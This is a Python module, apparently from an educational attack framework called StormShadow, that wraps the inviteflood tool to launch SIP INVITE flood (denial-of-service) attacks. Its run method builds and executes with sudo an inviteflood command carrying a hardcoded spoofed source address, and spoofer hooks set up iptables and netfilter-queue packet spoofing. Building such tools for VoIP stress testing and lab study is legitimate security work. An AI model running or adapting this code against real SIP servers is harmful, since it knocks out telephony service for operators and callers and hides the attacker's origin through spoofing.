"""
InviteFlood Attack Module.

Implements SIP INVITE flood attacks using the inviteflood tool.
This module integrates with the StormShadow orchestrator architecture.
"""

from pathlib import Path
from typing import List, Optional
from utils.attack.attack_enums import AttackProtocol, AttackType
from utils.core.printing import print_error, print_info
from utils.interfaces.attack_interface import AttackInterface
from utils.registry.metadata import ModuleInfo
from utils.core.command_runner import run_command

from sip_attacks.sip_spoofing import SipPacketSpoofer 

class InviteFloodAttack(AttackInterface):
    """
    SIP INVITE Flood Attack Module.
    This module implements a SIP INVITE flood attack using the inviteflood tool.
    """
    # Module information for the registry
    infos : ModuleInfo  = ModuleInfo(
        description="SIP INVITE Flood Attack Module using inviteflood tool",
        version="1.0.0",
        author="Corentin COUSTY",
        requirements=["inviteflood"],
        license="Educational Use Only"
    )

    def __init__(self, 
                 target_ip: str = "127.0.0.1",
                 rate: int = 0,
                 delay: float = 0.0,
                 target_port: int = 5060,
                 interface: str = "eth0",
                 source_port: int = 0,
                 attack_queue_num: int = 1,
                 max_count: int = 0,
                 max_duration: int = 0,
                 user_agent: str = "StormShadow",
                 spoofing_subnet: Optional[str] = None,
                 custom_payload_path: Optional[Path] = None,
                 sip_users: List[int] = []) -> None:
        """Initialize the attack with parameters."""
 
        # Call the parent class constructor
        super().__init__(
            target_ip=target_ip,
            rate=rate,
            delay=delay,
            target_port=target_port,
            interface=interface,
            source_port=source_port,
            attack_queue_num=attack_queue_num,
            max_count=max_count,
            max_duration=max_duration,
            user_agent=user_agent,
            spoofing_subnet=spoofing_subnet,
            custom_payload_path=custom_payload_path,
            sip_users=sip_users
        )
        self.attack_type = AttackType.DDOS  # Set a specific attack type for this template
        self.attack_protocol = AttackProtocol.SIP  # Set a specific protocol for this template
        self.name = "InviteFloodAttack"
        self.dry_run_implemented = True  # Indicate that dry-run is implemented for this attack
        self.resume_implemented = True  # Indicate that resume is implemented for this
        self.spoofing_implemented = True  # Indicate that spoofing is implemented for this attack

        self.spoofer : Optional[SipPacketSpoofer] = SipPacketSpoofer(
            attack_queue_num=attack_queue_num,
            spoofed_subnet=spoofing_subnet,
            victim_port=target_port,
            victim_ip=target_ip,
            attacker_port=source_port
        ) if spoofing_subnet else None

        self.debug_parameters()
        # Print the initialization message

        print_info(f"InviteFlood attack initialized with target: {target_ip}:{target_port}")

    def cleanup(self) -> None:
        print_info("Cleaning up InviteFlood attack resources")
        # Implement any necessary cleanup logic here
    
    def end(self):
        print_info("Ending the InviteFlood attack")
        print_info("Cleaning up resources used by the InviteFlood attack")
        self.cleanup()

    def run(self) -> None:
        print_info("Running InviteFlood attack")
        # Build the inviteflood command with required and optional arguments
        try:
            command = (
                f"inviteflood "
                f"{self.interface} "
                f'200 '  # target user (empty string for all)
                f"{self.target_ip} "  # target domain (using IP)
                f"{self.target_ip} "  # IPv4 addr of flood target
                f"{self.max_count} "  # flood stage (number of packets)
                f"-i 10.10.123.1 "  # source IP address
                f"-S {self.source_port} "  # source port
                # f"-D {self.target_port} "  # destination port
            )
            run_command(command,sudo=True, capture_output=False, check=True)
        except Exception as e:
            print_error(f"Failed to run InviteFlood attack: {e}")
            self.cleanup()
            return

    def stop(self) -> None:
        print_info("Stopping InviteFlood attack")
        print_info("Ending the attack and cleanup resources by default")
        self.end()
    
    def get_attack_description(self) -> str:
        return "This is a InviteFlood attack module for demonstration purposes." \
        "It can be extended to implement specific attack logic." \
        "It inherits from AttackInterface and implements the required methods."

    def start_spoofing(self) -> bool:
        """
        Implement spoofing logic for the InviteFlood attack.
        
        This method should set up the necessary iptables rules and netfilter queue
        to handle packet spoofing if required by the attack.
        
        Returns:
            bool: True if spoofing is successfully set up, False otherwise.
        """
        print_info("Setting up spoofing for InviteFlood attack")
        if self.spoofer:
            if not self.spoofer.start_spoofing():
                print_error("Failed to start spoofing for InviteFlood attack")
                return False
            print_info("Spoofing started successfully for InviteFlood attack")
            return True
        else:
            print_error("No spoofing configured for InviteFlood attack")
            return False

    def stop_spoofing(self) -> bool:
        """
        Stop spoofing for the InviteFlood attack.
        
        This method should remove the iptables rules and netfilter queue
        used for packet spoofing if it was set up.
        
        Returns:
            bool: True if spoofing is successfully stopped, False otherwise.
        """
        print_info("Stopping spoofing for InviteFlood attack")
        if self.spoofer:
            if not self.spoofer.stop_spoofing():
                print_error("Failed to stop spoofing for InviteFlood attack")
                return False
            print_info("Spoofing stopped successfully for InviteFlood attack")
            return True
        else:
            print_error("No spoofing configured to stop for InviteFlood attack")
            return False